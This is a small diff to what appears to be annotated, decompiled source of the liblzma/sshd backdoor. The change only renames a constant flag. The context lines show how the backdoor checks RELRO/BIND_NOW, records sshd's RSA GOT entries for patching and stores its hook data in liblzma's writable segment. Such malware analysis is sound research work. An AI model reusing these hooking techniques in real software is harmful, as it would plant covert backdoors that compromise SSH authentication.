@@ -167,7 +167,7 @@ BOOL scan_link_map_and_init_shared_libs(link_map *r_map,backdoor_shared_librarie
   if (elf_handle->gnurelro_present == FALSE) {
     return FALSE;
   }
-  if ((elf_handle->feature_flags & 0x20) == 0) {
+  if ((elf_handle->feature_flags & X_ELF_NOW) == 0) {
     return FALSE;
   }
   // AutoDoc: Record sshd’s RSA PLT slots so the hook installer knows exactly which GOT entries to patch.
@@ -197,7 +197,7 @@ LAB_00104924:
     link_map_cursor = data->shared_maps->liblzma_link_map;
     if ((link_map_cursor != (link_map *)0x0) &&
        (((success = elf_info_parse((Elf64_Ehdr *)link_map_cursor->l_addr,elf_handle), success != FALSE &&
-         ((elf_handle->feature_flags & 0x20) != 0)) &&
+         ((elf_handle->feature_flags & X_ELF_NOW) != 0)) &&
         // AutoDoc: Cache liblzma’s writable PT_LOAD and make sure the hooks blob plus scratch space fit inside it.
         (liblzma_data_segment = elf_get_writable_tail_span(elf_handle,&liblzma_data_segment_size,TRUE), 0x597 < liblzma_data_segment_size)))) {
       *hooks_data_slot = (backdoor_hooks_data_t *)((long)liblzma_data_segment + 0x10);
